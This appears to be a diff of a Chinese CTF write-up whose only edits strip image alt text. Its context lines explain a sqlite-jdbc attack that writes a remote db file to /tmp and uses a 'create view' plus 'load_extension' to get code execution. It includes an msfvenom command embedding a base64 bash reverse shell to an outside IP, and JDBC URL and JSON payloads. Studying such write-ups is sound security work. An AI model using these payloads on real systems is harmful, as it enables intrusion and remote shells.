@@ -1045,13 +1045,13 @@ sqlite官网列出了PRAGMAs
 
 https://www.sqlite.org/pragma.html
 
-![image-20241220204530154](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220204530154.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220204530154.png)
 
 可以理解成sqlite的api
 
 `org.sqlite.SQLiteConfig.apply()`处，给出了从jdbc参数转化为PRAGMA语句的代码，把参数对应的(key,value)转变为`pragma key=value`
 
-![image-20241220211000864](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220211000864.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220211000864.png)
 
 除了这些PRAGMA，在SQLiteConfig定义的枚举变量还有一些不在上图的others语句，也就是下面注释的`// Parameters requiring SQLite3 API invocation`和`// Others`
 
@@ -1127,11 +1127,11 @@ public static enum Pragma {
 
 锁定到sqlite-jdbc 2023 May19的一条Commit
 
-![image-20241220213331722](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220213331722.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220213331722.png)
 
 先看代码，只是把resourceAddr.hashCode换成了UUID.randomUUID。让远程加载数据库文件的缓存文件变得不可预测
 
-![image-20241220213533629](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220213533629.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220213533629.png)
 
 这条Commit下面的Comment也很有意思，说这版代码用着会持续不断地创建sqlite-jdbc-tep-%s.db，会损耗磁盘空间，而生成的db缓存文件在程序结束不会被删除。问能不能还原该commit
 
@@ -1141,17 +1141,17 @@ public static enum Pragma {
 
 如果文件名不以`:memory`或`file:`开头，或不包含`mode=memory`，则进入第二个if；如果文件名以`resource:`开头，则把文件名转为URL，调用extractResource去远程加载
 
-![image-20241220220125863](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220220125863.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220220125863.png)
 
 比如`jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db`就能远程加载db文件
 
 跟进到extractResource看看怎么加载的，获取了系统的tmp目录，然后文件名为`sqlite-jdbc-tmp-%d.db`带入` resourceAddr.hashCode()`
 
-![image-20241221170430563](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221170430563.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221170430563.png)
 
 接着从resourceAddr获取文件内容写进了上面的db文件
 
-![image-20241221170738225](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221170738225.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221170738225.png)
 
 只是写文件似乎还不够，有没有办法达到RCE呢
 
@@ -1198,7 +1198,7 @@ create view y4tacker as SELECT (select load_extension('/tmp/....so'))
 
 正巧，在open方法内，extractResource之后就执行了NativeDB.open去加载db文件
 
-![image-20241221180411860](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221180411860.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221180411860.png)
 
 执行create view语句后，再执行固定的select就会被劫持成执行`select load_extension('/tmp/....so')`
 
@@ -1237,35 +1237,35 @@ jdbc:sqlite:file:/tmp/sqlite-jdbc-tmp-hashcode.db?enable_load_extension=true
 
 先看下依赖，给了sqlite,mysql,postgresql的JDBC依赖，还有aspectjweaver
 
-![image-20241221195230733](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195230733.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195230733.png)
 
-![image-20241221195242663](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195242663.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195242663.png)
 
-![image-20241221195248562](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195248562.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195248562.png)
 
 可惜没给spring-expression依赖，不然能打postgreSQL的SpEL注入
 
 审代码，看到JdbcController，调用了DatasourceServiceImpl.testDatasourceConnectionAble
 
-![image-20241221195842587](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195842587.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195842587.png)
 
 testDatasourceConnectionAble里分别给出了三个JDBC的case，其中case3就是调用SqliteDatasourceConnector进行连接，继续跟进
 
-![image-20241221200008209](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200008209.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200008209.png)
 
 环境先开启了enableLoadExtension，然后调用getConnection
 
-![image-20241221200127396](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200127396.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200127396.png)
 
 这就是个JDBC Attack的点，可以用来写文件到/tmp下
 
 继续看到getTableContent，调用了select
 
-![image-20241221200407450](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200407450.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200407450.png)
 
 case里，connector之后就调用了getTableContent
 
-![image-20241221200508187](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200508187.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200508187.png)
 
 #### 题解1：sqlite写缓存题解
 
@@ -1285,7 +1285,7 @@ msfvenom -p linux/x64/exec CMD='echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTU
 
 开个http服务挂evil.so
 
-![image-20241221202529840](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221202529840.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221202529840.png)
 
 写两行代码看下写进去的so文件名
 
@@ -1334,19 +1334,19 @@ public class Main {
 
 poc.db二进制：
 
-![image-20241222153642993](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222153642993.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222153642993.png)
 
 继续上传恶意poc.db，代码会自动执行：
 
-![image-20241221204750389](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221204750389.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221204750389.png)
 
 MD，向日葵普通版不支持http，只能tcp，半天没打进，鼠鼠这次是真要买个vps了
 
 重金之下，终于弹回了shell
 
-![image-20241221210850016](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221210850016.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221210850016.png)
 
-![image-20241221210934151](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221210934151.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221210934151.png)
 
 如果没开enable_load_extension，也可以直接开，题目是代码开了
 
@@ -1356,7 +1356,7 @@ jdbc:sqlite:file:/tmp/sqlite-jdbc-tmp-hashcode.db?enable_load_extension=true
 
 select的触发，是传tableName参数，完成了`select * from security`触发视图
 
-![image-20241221212758961](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221212758961.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221212758961.png)
 
 #### 题解2：无create裸打
 
@@ -1370,11 +1370,11 @@ select的触发，是传tableName参数，完成了`select * from security`触�
  "url":"jdbc:sqlite:file:/tmp/any.db"}
 ```
 
-![image-20241222153108045](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222153108045.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222153108045.png)
 
 随便传一个jdbc url串，让代码能够顺利走到getTableContent
 
-![image-20241222153459969](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222153459969.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222153459969.png)
 
 上面的payload是触发了`select * from (select (load_extension(\"/tmp/sqlite-jdbc-tmp-882872429.db\"))`
 
